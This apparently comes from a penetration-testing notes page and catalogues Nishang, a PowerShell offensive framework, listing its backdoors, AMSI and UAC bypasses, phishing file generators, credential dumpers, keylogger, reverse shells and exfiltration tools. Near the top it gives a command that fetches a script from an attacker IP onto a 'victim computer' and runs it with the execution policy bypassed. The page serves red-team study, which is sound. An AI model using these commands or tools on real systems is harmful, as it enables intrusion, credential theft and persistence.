---
description: >-
  Nishang is a framework and collection of scripts and payloads which enables
  usage of PowerShell for offensive security, penetration testing and red
  teaming. Nishang is useful during all phases of pene
---

# Nishang

Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

**Link**: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang) 

Also installed by default on Kali: 

```text
root@kali:~# ls -l /usr/share/nishang/ 
total 48 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Antak-WebShell 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Backdoors 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Escalation 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Execution 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Gather 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Misc 
-rw-r--r-- 1 root root  495 Jun  4 11:14 nishang.psm1 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Pivot 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 powerpreter 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Prasadhak 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Scan 
drwxr-xr-x 2 root root 4096 Jun  4 11:15 Utility 
```

We will need to upload the nishang scripts into the victim computer: 

`powershell iwr -uri 10.10.14.14/{Nishang script}`  

Load the script: 

`powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1` 

## Scripts 

Nishang currently contains the following scripts and payloads. 

### ActiveDirectory 

* [Get-Unconstrained](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Get-Unconstrained.ps1) – Find computers in active directory which have Kerberos Unconstrained Delegation enabled. 

### Antak – the Webshell 

* [Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell) – Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell. 

### Backdoors 

* [HTTP-Backdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/HTTP-Backdoor.ps1) – A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory. 
* [DNS\_TXT\_Pwnage](https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1) – A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries. 
* [Execute-OnTime](https://github.com/samratashok/nishang/blob/master/Backdoors/Execute-OnTime.ps1) – A backdoor which can execute PowerShell scripts at a given time on a target. 
* [Gupt-Backdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Gupt-Backdoor.ps1) – A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. 
* [Add-ScrnSaveBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Add-ScrnSaveBackdoor.ps1) – A backdoor which can use Windows screen saver for remote command and script execution. 
* [Invoke-ADSBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1) – A backdoor which can use alternate data streams and Windows Registry to achieve persistence. 
* [Add-RegBackdoor](https://github.com/samratashok/nishang/blob/master/Backdoors/Add-RegBackdoor.ps1) – A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman \(Windows key + U\). 
* [Set-RemoteWMI](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) – Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user. 
* [Set-RemotePSRemoting](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1) – Modify permissions of PowerShell remoting to allow access to a non-admin user. 

### Bypass 

* [Invoke-AmsiBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1) – Implementation of publicly known methods to bypass/avoid AMSI. 

### Client 

* [Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) – Create infected CHM files which can execute PowerShell commands and scripts. 
* [Out-Word](https://github.com/samratashok/nishang/blob/master/Client/Out-Word.ps1) – Create Word files and infect existing ones to run PowerShell commands and scripts. 
* [Out-Excel](https://github.com/samratashok/nishang/blob/master/Client/Out-Excel.ps1) – Create Excel files and infect existing ones to run PowerShell commands and scripts. 
* [Out-HTA](https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1) – Create a HTA file which can be deployed on a web server and used in phishing campaigns. 
* [Out-Java](https://github.com/samratashok/nishang/blob/master/Client/Out-Java.ps1) – Create signed JAR files which can be used with applets for script and command execution. 
* [Out-Shortcut](https://github.com/samratashok/nishang/blob/master/Client/Out-Shortcut.ps1) – Create shortcut files capable of executing PowerShell commands and scripts. 
* [Out-WebQuery](https://github.com/samratashok/nishang/blob/master/Client/Out-WebQuery.ps1) – Create IQY files for phishing credentials and SMB hashes. 
* [Out-JS](https://github.com/samratashok/nishang/blob/master/Client/Out-JS.ps1) – Create JS files capable of executing PowerShell commands and scripts. 
* [Out-SCT](https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1) – Create SCT files capable of executing PowerShell commands and scripts. 
* [Out-SCF](https://github.com/samratashok/nishang/blob/master/Client/Out-SCF.ps1) – Create a SCF file which can be used for capturing NTLM hash challenges. 

### Escalation 

* [Enable-DuplicateToken](https://github.com/samratashok/nishang/blob/master/Escalation/Enable-DuplicateToken.ps1) – When SYSTEM privileges are required. 
* [Remove-Update](https://github.com/samratashok/nishang/blob/master/Escalation/Remove-Update.ps1) – Introduce vulnerabilities by removing patches. 
* [Invoke-PsUACme](https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1) – Bypass UAC. 

### Execution 

* [Download-Execute-PS](https://github.com/samratashok/nishang/blob/master/Execution/Download-Execute-PS.ps1) – Download and execute a PowerShell script in memory. 
* [Download\_Execute](https://github.com/samratashok/nishang/blob/master/Execution/Download_Execute.ps1) – Download an executable in text format, convert it to an executable, and execute. 
* [Execute-Command-MSSQL](https://github.com/samratashok/nishang/blob/master/Execution/Execute-Command-MSSQL.ps1) – Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges. 
* [Execute-DNSTXT-Code](https://github.com/samratashok/nishang/blob/master/Execution/Execute-DNSTXT-Code.ps1) – Execute shellcode in memory using DNS TXT queries. 
* [Out-RundllCommand](https://github.com/samratashok/nishang/blob/master/Execution/Out-RundllCommand.ps1) – Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe. 

### Gather 

* [Check-VM](https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1) – Check for a virtual machine. 
* [Copy-VSS](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1) – Copy the SAM file using Volume Shadow Copy Service. 
* [Invoke-CredentialsPhish](https://github.com/samratashok/nishang/blob/master/Gather/Credentials.ps1) – Trick a user into giving credentials in plain text. 
* [FireBuster](https://github.com/samratashok/nishang/blob/master/Gather/FireBuster.ps1) [FireListener](https://github.com/samratashok/nishang/blob/master/Gather/FireListener.ps1) – A pair of scripts for egress testing 
* [Get-Information](https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1) – Get juicy information from a target. 
* [Get-LSASecret](https://github.com/samratashok/nishang/blob/master/Gather/Get-LSASecret.ps1) – Get LSA Secret from a target. 
* [Get-PassHashes](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1) – Get password hashes from a target. 
* [Get-WLAN-Keys](https://github.com/samratashok/nishang/blob/master/Gather/Get-WLAN-Keys.ps1) – Get WLAN keys in plain text from a target. 
* [Keylogger](https://github.com/samratashok/nishang/blob/master/Gather/Keylogger.ps1) – Log keystrokes from a target. 
* [Invoke-MimikatzWdigestDowngrade](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-MimikatzWDigestDowngrade.ps1) – Dump user passwords in plain on Windows 8.1 and Server 2012 
* [Get-PassHints](https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1) – Get password hints of Windows users from a target. 
* [Show-TargetScreen](https://github.com/samratashok/nishang/blob/master/Gather/Show-TargetScreen.ps1) – Connect back and Stream target screen using MJPEG. 
* [Invoke-Mimikatz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1) – Load mimikatz in memory. Updated and with some customisation. 
* [Invoke-Mimikittenz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikittenz.ps1) – Extract juicy information from target process \(like browsers\) memory using regex. 
* [Invoke-SSIDExfil](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SSIDExfil.ps1) – Exfiltrate information like user credentials, using WLAN SSID. 
* [Invoke-SessionGopher](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-SessionGopher.ps1) – Identify admin jump-boxes and/or computers used to access Unix machines. 

### MITM 

* [Invoke-Interceptor](https://github.com/samratashok/nishang/blob/master/MITM/Invoke-Interceptor.ps1) – A local HTTPS proxy for MITM attacks. =

### Pivot 

* [Create-MultipleSessions](https://github.com/samratashok/nishang/blob/master/Pivot/Create-MultipleSessions.ps1) – Check credentials on multiple computers and create PSSessions. 
* [Run-EXEonRemote](https://github.com/samratashok/nishang/blob/master/Pivot/Run-EXEonRemote.ps1)  – Copy and execute an executable on multiple machines. 
* [Invoke-NetworkRelay](https://github.com/samratashok/nishang/blob/master/Pivot/Invoke-NetworkRelay.ps1)  – Create network relays between computers. 

### Prasadhak 

* [Prasadhak](https://github.com/samratashok/nishang/blob/master/Prasadhak/Prasadhak.ps1) – Check running hashes of running process against the VirusTotal database. 

### Scan 

* [Brute-Force](https://github.com/samratashok/nishang/blob/master/Scan/Brute-Force.ps1) – Brute force FTP, Active Directory, MSSQL, and Sharepoint. 
* [Port-Scan](https://github.com/samratashok/nishang/blob/master/Scan/Port-Scan.ps1) – A handy port scanner. 

### Powerpreter 

* [Powerpreter](https://github.com/samratashok/nishang/tree/master/powerpreter) – All the functionality of nishang in a single script module. 

### Shells 

* [Invoke-PsGcat](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcat.ps1) – Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent 
* [Invoke-PsGcatAgent](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PsGcatAgent.ps1) – Execute commands and scripts sent by Invoke-PsGcat. 
* [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) – An interactive PowerShell reverse connect or bind shell 
* [Invoke-PowerShellTcpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) – Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets. 
* [Invoke-PowerShellTcpOneLineBind](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1) – Bind version of Invoke-PowerShellTcpOneLine. 
* [Invoke-PowerShellUdp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1) – An interactive PowerShell reverse connect or bind shell over UDP 
* [Invoke-PowerShellUdpOneLine](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdpOneLine.ps1) – Stripped down version of Invoke-PowerShellUdp. 
* [Invoke-PoshRatHttps](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttps.ps1) – Reverse interactive PowerShell over HTTPS. 
* [Invoke-PoshRatHttp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PoshRatHttp.ps1) – Reverse interactive PowerShell over HTTP. 
* [Remove-PoshRat](https://github.com/samratashok/nishang/blob/master/Shells/Remove-PoshRat.ps1) – Clean the system after using Invoke-PoshRatHttps 
* [Invoke-PowerShellWmi](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellWmi.ps1) – Interactive PowerShell using WMI. 
* [Invoke-PowerShellIcmp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1) – An interactive PowerShell reverse shell over ICMP. 
* [Invoke-JSRatRundll](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRundll.ps1) – An interactive PowerShell reverse shell over HTTP using rundll32.exe. 
* [Invoke-JSRatRegsvr](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-JSRatRegsvr.ps1) – An interactive PowerShell reverse shell over HTTP using regsvr32.exe. 

### Utility 

* [Add-Exfiltration](https://github.com/samratashok/nishang/blob/master/Utility/Add-Exfiltration.ps1) – Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script. 
* [Add-Persistence](https://github.com/samratashok/nishang/blob/master/Utility/Add-Persistence.ps1) – Add reboot persistence capability to a script. 
* [Remove-Persistence](https://github.com/samratashok/nishang/blob/master/Utility/Remove-Persistence.ps1) – Remote persistence added by the Add-Persistence script. 
* [Do-Exfiltration](https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1) – Pipe \(\|\) this to any script to exfiltrate the output. 
* [Download](https://github.com/samratashok/nishang/blob/master/Utility/Download.ps1) – Transfer a file to the target. 
* [Parse\_Keys](https://github.com/samratashok/nishang/blob/master/Utility/Parse_Keys.ps1) – Parse keys logged by the keylogger. 
* [Invoke-Encode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1) – Encode and compress a script or string. 
* [Invoke-Decode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Decode.ps1) – Decode and decompress a script or string from Invoke-Encode. 
* [Start-CaptureServer](https://github.com/samratashok/nishang/blob/master/Utility/Start-CaptureServer.ps1) – Run a web server which logs Basic authentication and SMB hashes. 
* [ConvertTo-ROT13](https://github.com/samratashok/nishang/blob/master/Utility/ConvertTo-ROT13.ps1) – Encode a string to ROT13 or decode a ROT13 string. 
* [Out-DnsTxt](https://github.com/samratashok/nishang/blob/master/Utility/Out-DnsTxt.ps1) – Generate DNS TXT records which could be used with other scripts. 

